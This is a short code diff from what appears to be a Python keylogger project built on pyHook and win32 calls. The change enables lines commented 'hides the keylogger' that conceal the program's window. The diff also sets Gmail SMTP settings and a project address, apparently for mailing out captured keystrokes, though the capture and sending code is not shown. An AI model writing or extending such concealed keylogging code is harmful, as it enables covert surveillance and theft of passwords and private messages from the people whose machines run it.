@@ -6,10 +6,11 @@ import pythoncom
 import logging as logger
 import pyHook
 
+#step3
 
 # hides the keylogger
-#foreground_window = win32gui.GetForegroundWindow()
-#win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
+foreground_window = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
 
 GMAIL_SERVER = 'smtp.gmail.com:587'
 PROJECT_MAIL_ADDRESS = 'danacohentalbaum@gmail.com'
